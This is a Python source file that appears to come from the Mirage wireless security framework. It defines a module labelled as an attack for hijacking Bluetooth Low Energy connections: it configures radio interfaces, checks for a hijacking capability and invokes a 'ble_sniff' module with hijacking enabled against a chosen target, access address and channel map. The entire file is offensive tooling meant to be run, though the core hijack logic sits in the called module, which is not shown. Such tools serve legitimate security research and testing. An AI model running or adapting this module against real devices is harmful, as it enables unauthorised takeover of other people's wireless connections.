from mirage.core import module
from mirage.libs import io, utils


class ble_hijack(module.WirelessModule):
	def init(self):

		self.technology = "ble"
		self.type = "attack"
		self.description = "Hijacking module for Bluetooth Low Energy Connections"
		self.dependencies = ["ble_sniff"]
		self.args = {
				"INTERFACE":"microbit0",
				"INTERFACEA":"",
				"INTERFACEB":"",
				"TARGET":"",
				"CHANNEL":"37", 
				"HIJACKING_MODE":"newConnections", 
				"ACCESS_ADDRESS":"", 
				"CRC_INIT":"", 	
				"CHANNEL_MAP":""
			}

	def checkCapabilities(self):
		return all([receiver.hasCapabilities("HIJACKING_CONNECTIONS") for receiver in self.receivers])

	def initEmittersAndReceivers(self):
		self.emitters = []	
		self.receivers = []
		if self.args["INTERFACE"] != "" and self.args["INTERFACE"] != self.args["INTERFACEA"]:
			interface = self.args["INTERFACE"]
			self.emitters.append(self.getEmitter(interface=interface))
			self.receivers.append(self.getReceiver(interface=interface))
		if self.args["INTERFACEA"] != ""  and self.args["INTERFACEB"] != self.args["INTERFACEA"]:
			interfacea  = self.args["INTERFACEA"]
			self.emitters.append(self.getEmitter(interface=interfacea))
			self.receivers.append(self.getReceiver(interface=interfacea))
		if self.args["INTERFACEB"] != "" and self.args["INTERFACEB"] != self.args["INTERFACE"]:
			interfaceb  = self.args["INTERFACEB"]
			self.emitters.append(self.getEmitter(interface=interfaceb))
			self.receivers.append(self.getReceiver(interface=interfaceb))
	
	def run(self):
		self.initEmittersAndReceivers()
		if self.checkCapabilities():

			hijackingModule = utils.loadModule("ble_sniff")
			hijackingModule["INTERFACE"] = self.args["INTERFACE"]
			hijackingModule["INTERFACEA"] = self.args["INTERFACEA"]
			hijackingModule["INTERFACEB"] = self.args["INTERFACEB"]
			hijackingModule["SNIFFING_MODE"] = self.args["HIJACKING_MODE"]
			hijackingModule["TARGET"] = self.args["TARGET"]
			hijackingModule["ACCESS_ADDRESS"] = self.args["ACCESS_ADDRESS"]
			hijackingModule["CRC_INIT"] = self.args["CRC_INIT"]
			hijackingModule["CHANNEL_MAP"] = self.args["CHANNEL_MAP"]
			hijackingModule["HIJACKING"] = "yes"
			hijackingModule["JAMMING"] = "no"
			hijackingModule["CHANNEL"] = self.args["CHANNEL"]
			hijackingModule["PCAP_FILE"] = ""
			output = hijackingModule.execute()
			if output["success"]:
				return self.ok(output["output"])
		else:
			io.fail("Interface provided ("+str(self.args["INTERFACE"])+") is not able to hijack a connection.")
			return self.nok()
